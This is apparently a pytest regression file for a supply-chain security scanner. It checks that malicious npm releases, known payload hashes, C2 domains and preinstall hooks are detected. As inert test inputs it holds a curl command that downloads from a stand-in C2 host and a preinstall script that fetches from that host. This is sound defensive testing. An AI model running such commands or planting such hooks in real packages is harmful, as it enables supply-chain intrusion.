"""Behavior regressions for operation-bound, inert runtime intelligence."""

import hashlib
import json

import pytest

from aurascan.analyzers import npm_supply_chain
from aurascan.analyzers.deep_static import DeepStaticAnalyzer
from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.analyzers.npm_lifecycle import inspect_npm_lifecycle
from aurascan.core import security_audit
from aurascan.core.intelligence import IntelligenceError, snapshot_from_payload
from aurascan.core.models import AnalysisResult, Phase, Severity
from aurascan.core.security_audit import (
    SecurityAuditReport, audit_vendor_emergency_exposure, build_security_audit,
)
from aurascan.core.upgrade_preflight import (
    UpgradePackage, UpgradePlan, security_audit_upgrade_findings,
)
from tests.helpers.intelligence_fixtures import bundled_payload


REFERENCE = "https://security.example.invalid/reviewed-advisory"
PAYLOAD = b"inert reviewed bytes; not an executable payload\n"


def future_data(*, broad="none"):
    data = bundled_payload()
    data["npm_campaigns"] = [{
        "id": "NPM-INERT-INDEPENDENT-CAMPAIGN",
        "reviewed_at": "2026-09-12", "references": [REFERENCE],
        "rights": {"redistribution": "permitted", "basis": "Self-authored inert test record."},
        "packages": [{
            "name": "inert-selected-package", "versions": ["1.2.3"],
            "advisory_ids": ["INERT-ADVISORY-001"], "references": [REFERENCE],
            "broad_advisory": broad,
        }],
        "payload_sha256": [hashlib.sha256(PAYLOAD).hexdigest()],
        "malicious_domains": ["c2.example.invalid"],
    }]
    return data


def snapshot(*, broad="none"):
    return snapshot_from_payload(future_data(broad=broad), sequence=1, source="system", status="current")


class NoClamAV:
    def scan_unpacked_source(self, *_args):
        return AnalysisResult(True, "inert test transport", [])


def forbid(*_args, **_kwargs):
    pytest.fail("operation must not fetch or load different intelligence")


def test_new_campaign_package_uses_generic_compiled_rule_and_own_attribution():
    intelligence = snapshot()
    findings = npm_supply_chain.analyze_npm_install_commands(
        "npm install inert-selected-package@1.2.3", "PKGBUILD", Phase.pkgbuild_static, intelligence,
    )
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "SUPPLYCHAIN-NPM-MALICIOUS-RELEASE-001"
    assert finding.blocks_installation and finding.severity == Severity.CRITICAL
    assert "NPM-INERT-INDEPENDENT-CAMPAIGN" in finding.explanation
    assert "SHAI" not in json.dumps(finding.to_dict()).upper()


@pytest.mark.parametrize("version", ["1.2.4", "latest", "^1.2.3", "", "2.0.0"])
def test_exact_only_record_never_invents_broad_advisory(version):
    intelligence = snapshot()
    findings = npm_supply_chain.inspect_npm_campaign_metadata(
        "package.json", json.dumps({"dependencies": {"inert-selected-package": version}}), intelligence,
    )
    assert findings == []


def test_explicit_broad_advisory_retains_review_without_claiming_identical_payload():
    findings = npm_supply_chain.inspect_npm_campaign_metadata(
        "package.json", '{"dependencies":{"inert-selected-package":"latest"}}', snapshot(broad="all_versions"),
    )
    assert len(findings) == 1
    assert findings[0].rule_id == "DEEPSTATIC-NPM-ADVISORY-REVIEW-001"
    assert findings[0].requires_manual_review and not findings[0].blocks_installation
    assert "does not confirm the identical payload" in findings[0].explanation


@pytest.mark.parametrize("command,expected", [
    ("curl https://c2.example.invalid/payload", True),
    ("curl --output https://c2.example.invalid/payload https://example.invalid", False),
    ('echo "curl https://c2.example.invalid/payload"', False),
    ("curl https://c2.example.invalid.other.example.invalid/payload", False),
])
def test_new_domain_requires_active_exact_network_destination(command, expected):
    findings = npm_supply_chain.analyze_npm_install_commands(command, "PKGBUILD", Phase.pkgbuild_static, snapshot())
    assert bool(findings) is expected
    if expected:
        assert findings[0].rule_id == "SUPPLYCHAIN-NPM-MALICIOUS-DESTINATION-001"
        assert "SHAI" not in findings[0].explanation.upper()


def test_new_campaign_hash_requires_captured_bytes_and_generic_attribution():
    intelligence = snapshot()
    finding, = npm_supply_chain.known_payload_findings("opaque.data", PAYLOAD, intelligence)
    assert finding.rule_id == "DEEPSTATIC-NPM-MALICIOUS-PAYLOAD-001"
    assert "SHAI" not in finding.explanation.upper()
    assert npm_supply_chain.known_payload_findings("hash.txt", finding.file_hash.encode(), intelligence) == []
    assert npm_supply_chain.known_payload_findings("changed.data", PAYLOAD + b"changed", intelligence) == []


def test_analyzers_hold_explicit_snapshot_without_helper_reload(tmp_path, monkeypatch):
    intelligence = snapshot()
    monkeypatch.setattr(npm_supply_chain, "bundled_snapshot", forbid)
    control = DeterministicAnalyzer(intelligence_snapshot=intelligence)
    result = control.analyze_pkgbuild(str(tmp_path / "PKGBUILD"), "build() { npm install inert-selected-package@1.2.3; }")
    assert any(item.rule_id == "SUPPLYCHAIN-NPM-MALICIOUS-RELEASE-001" for item in result.findings)
    (tmp_path / "opaque.data").write_bytes(PAYLOAD)
    (tmp_path / "package.json").write_text('{"name":"inert-selected-package","version":"1.2.3"}')
    source = DeepStaticAnalyzer(clamav=NoClamAV(), intelligence_snapshot=intelligence)
    findings = source.inspect_source_tree(tmp_path)
    assert {"DEEPSTATIC-NPM-MALICIOUS-PAYLOAD-001", "DEEPSTATIC-NPM-MALICIOUS-RELEASE-001"}.issubset(
        {item.rule_id for item in findings})


def test_lifecycle_new_host_uses_same_snapshot_and_does_not_attribute_campaign(tmp_path):
    path = str(tmp_path / "package.json")
    entry = str(tmp_path / "index.js")
    manifest = '{"scripts":{"preinstall":"bun run index.js"}}'
    # These strings are never run; fetching an inert reserved domain is a static role.
    script = 'fetch("https://c2.example.invalid/inert");'
    findings = inspect_npm_lifecycle(path, manifest, {entry: script}, intelligence_snapshot=snapshot())
    assert [item.rule_id for item in findings] == ["NPM-LIFECYCLE-SUPPLYCHAIN-001"]
    assert "SHAI" not in findings[0].explanation.upper()
    assert inspect_npm_lifecycle(path, manifest, {entry: 'console.log("c2.example.invalid");'},
                                 intelligence_snapshot=snapshot()) == []


def test_same_package_multiple_advisories_keep_distinct_originating_floors(monkeypatch):
    data = bundled_payload()
    second = dict(data["vendor_advisories"][0])
    second.update(id="INERT-SECOND-CHROMIUM-FLOOR", cve="CVE-2099-10001", fixed_floor="154.0.0.0",
                  vendor_reference=REFERENCE, exploitation_reference=REFERENCE)
    data["vendor_advisories"].append(second)
    intelligence = snapshot_from_payload(data)
    findings = audit_vendor_emergency_exposure({"chromium": "152.0.7977.82-1"}, intelligence)
    assert len(findings) == 2
    assert {item.advisory["fixed_floor"] for item in findings} == {"153.0.8010.36", "154.0.0.0"}
    assert all(item.advisory["intelligence_identity"] == intelligence.identity for item in findings)
    report = SecurityAuditReport(campaign=None, findings=findings, intelligence=intelligence.metadata())
    monkeypatch.setattr(security_audit, "bundled_snapshot", forbid)
    monkeypatch.setattr(security_audit, "load_intelligence_snapshot", forbid)
    plan = UpgradePlan(repo_packages=[UpgradePackage(name="chromium", new_version="153.0.8010.36-1")])
    remaining = security_audit_upgrade_findings(report, plan, version_compare=forbid)
    assert len(remaining) == 1 and "CVE-2099-10001" in remaining[0].summary
    assert "Google" not in remaining[0].summary and "V8" not in remaining[0].why_it_matters


def test_legacy_finding_without_captured_advisory_cannot_be_suppressed():
    findings = audit_vendor_emergency_exposure({"chromium": "152.0.7977.82-1"})
    findings[0].advisory = {}
    plan = UpgradePlan(repo_packages=[UpgradePackage(name="chromium", new_version="999.0.0.0-1")])
    report = SecurityAuditReport(campaign=None, findings=findings)
    assert len(security_audit_upgrade_findings(report, plan, version_compare=forbid)) == 1


def test_unsupported_vendor_comparator_is_rejected_before_any_audit():
    data = bundled_payload()
    data["vendor_advisories"][0]["comparator"] = "run-pacman-or-custom-python"
    with pytest.raises(IntelligenceError):
        snapshot_from_payload(data)


@pytest.mark.parametrize("status,error", [("current", ""), ("stale", ""), ("unavailable", "unavailable")])
def test_audit_reports_explicit_snapshot_status_without_loading_another(tmp_path, monkeypatch, status, error):
    intelligence = snapshot_from_payload(bundled_payload(), source="system", status=status, coverage_error=error)
    monkeypatch.setattr(security_audit, "load_intelligence_snapshot", forbid)
    report = build_security_audit(
        root=tmp_path / "root", home=tmp_path / "home", state_root=tmp_path / "state",
        installed_packages={"chromium": "152.0.7977.82-1"}, log_paths=[], runner=forbid,
        which=forbid, urlopen=forbid, include_arch_audit=False, include_host_indicators=False,
        offline=True, intelligence_snapshot=intelligence,
    )
    assert report.intelligence["identity"] == intelligence.identity
    assert report.to_dict()["intelligence"]["status"] == status
    assert "Runtime intelligence: " + status in report.render_terminal(use_color=False)
    assert len(report.vendor_emergency_findings) == 1
    assert bool(any(item.rule_id == "INTELLIGENCE-UNAVAILABLE-001" for item in report.findings)) is bool(error)
    assert report.status == ("partial" if error else "ok")
